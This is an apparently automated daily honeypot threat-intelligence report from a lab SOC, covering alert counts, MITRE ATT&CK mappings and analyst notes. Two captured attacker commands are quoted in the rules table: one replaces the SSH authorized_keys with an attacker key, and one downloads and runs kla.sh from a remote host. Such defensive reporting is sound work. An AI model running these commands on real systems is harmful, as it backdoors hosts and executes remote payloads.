# LearningLab01 Daily Threat Intelligence Report — 2026-09-29

Generated: 2026-09-29T13:15:05.069Z

Report window: 2026-09-28T13:15:05.034Z through 2026-09-29T13:15:05.034Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 200,078 |
| Attack-related alerts | 21,061 |
| Honeypot interactions | 176,796 |
| Authentication failures | 9,619 |
| Authentication successes | 568 |
| Critical alerts | 217 |
| High alerts | 653 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 217 critical-severity alerts require priority review.
- 653 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 16.93:1.
- Country attribution currently covers only 3.39% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110209: T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk (103,969 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 217 | 0.11% |
| High | 653 | 0.33% |
| Medium | 2,373 | 1.19% |
| Low | 196,835 | 98.38% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 9,619
- Authentication successes: 568
- Failure-to-success ratio: 16.93:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Authentication failure | 9,619 | 45.67% |
| Network attack | 8,516 | 40.43% |
| Payload delivery | 8,516 | 40.43% |
| Command execution | 1,907 | 9.05% |
| Reconnaissance | 316 | 1.50% |
| Malware | 172 | 0.82% |
| SMTP attack | 92 | 0.44% |
| Network scan | 86 | 0.41% |
| Web attack | 55 | 0.26% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 6,778 alerts, representing 3.39% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 193,300 | 96.61% | Not geolocated |
| Republic of Moldova | 2,336 | 1.17% | ████████████████████ |
| New Zealand | 2,212 | 1.11% | ███████████████████ |
| Germany | 1,841 | 0.92% | ████████████████ |
| United Kingdom | 192 | 0.10% | ██ |
| United States | 84 | 0.04% | █ |
| Hungary | 65 | 0.03% | █ |
| Netherlands | 22 | 0.01% | █ |
| Iran | 11 | 0.01% | █ |
| Russia | 6 | 0.00% | █ |
| China | 3 | 0.00% | █ |
| Malta | 3 | 0.00% | █ |
| Canada | 2 | 0.00% | █ |
| Turkey | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Initial Access | 303 |
| Defense Evasion | 292 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Credential Access | 160 |
| Lateral Movement | 97 |
| Execution | 40 |
| Command and Control | 16 |
| Impact | 11 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Brute Force | 160 |
| Remote Services | 97 |
| Command and Scripting Interpreter | 40 |
| Ingress Tool Transfer | 16 |
| Exploit Public-Facing Application | 12 |
| Stored Data Manipulation | 11 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110209 | 5 | 103,969 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (103,969) |
| 110213 | 4 | 23,188 | T-Pot RDP connection from [IP address] to port 3389. | tpot (23,188) |
| 110207 | 5 | 20,991 | T-Pot SentryPeer SIP activity from [IP address]:52700, method INVITE | tpot (20,991) |
| 110204 | 4 | 12,262 | T-Pot Honeytrap connection from [IP address] to port 5909 | tpot (12,262) |
| 110101 | 3 | 10,410 | Cowrie SSH connection from [IP address]. | tpot (10,410) |
| 110102 | 5 | 9,619 | Cowrie failed login from [IP address] using username root. | tpot (9,619) |
| 110205 | 6 | 8,460 | T-Pot Honeytrap received a payload from [IP address] | tpot (8,460) |
| 110219 | 4 | 6,597 | T-Pot CiscoASA web activity from [IP address]: "GET / HTTP/1.1" 200 - | tpot (6,597) |
| 110104 | 7 | 1,670 | Cowrie captured a command from [IP address]: uname -s -v -n -r -m | tpot (1,670) |
| 110201 | 4 | 500 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (500) |
| 110103 | 10 | 277 | Cowrie accepted login from [IP address] using username root. | tpot (277) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 110216 | 4 | 230 | T-Pot Mailoney received SMTP command from [IP address]: EHLO User  | tpot (230) |
| 110109 | 13 | 205 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (205) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 5502 | 3 | 165 | PAM: Login session closed. | tpot (163), wazuh (2) |
| 110106 | 10 | 160 | Cowrie detected repeated failed logins from [IP address]. | tpot (160) |
| 110105 | 12 | 128 | Cowrie captured a file download from [IP address]. | tpot (128) |
| 110221 | 7 | 114 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1" 404 - | tpot (114) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110217 | 7 | 92 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (92) |
| 110215 | 4 | 88 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (88) |
| 110214 | 9 | 80 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (80) |
| 110220 | 8 | 71 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (71) |
| 110212 | 10 | 56 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (56) |
| 110223 | 5 | 55 | T-Pot HoneyAML received  request from  to  on port . | tpot (55) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110108 | 12 | 28 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (28) |
| 110208 | 7 | 22 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5064 | tpot (22) |
| 110225 | 13 | 12 | T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address]. | tpot (12) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 2904 | 7 | 10 | Dpkg (Debian Package) half configured. | tpot (6), wazuh (4) |
| 110211 | 9 | 6 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (6) |
| 2902 | 7 | 5 | New dpkg (Debian Package) installed. | tpot (3), wazuh (2) |
| 110107 | 12 | 4 | Cowrie captured a probable payload-retrieval command from [IP address]: cd /tmp 2>/dev/null \|\| cd /var 2>/dev/null \|\| cd /dev/shm 2>/dev/null \|\| cd /run 2>/dev/null \|\| cd /root 2>/dev/null \|\| cd /;rm -f kla.sh;wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|busybox wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|curl -sLo kla.sh http://[IP address]/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet& | tpot (4) |
| 19010 | 3 | 3 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure all AppArmor Profiles are in enforce or complain mode.: Status changed from failed to passed | tpot (3) |
| 19011 | 9 | 3 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure all AppArmor Profiles are in enforce or complain mode.: Status changed from passed to failed | tpot (3) |
| 11 | 4 | 2 | Unknown | tpot (2) |
| 110222 | 9 | 2 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 203 | 9 | 2 | Agent event queue is full. Events may be lost. | tpot (2) |
| 110218 | 9 | 1 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (1) |
| 202 | 7 | 1 | Agent event queue is 90% full. | tpot (1) |
| 205 | 3 | 1 | Agent event queue is back to normal load. | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |
| 86003 | 3 | 1 | Docker: Error message | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
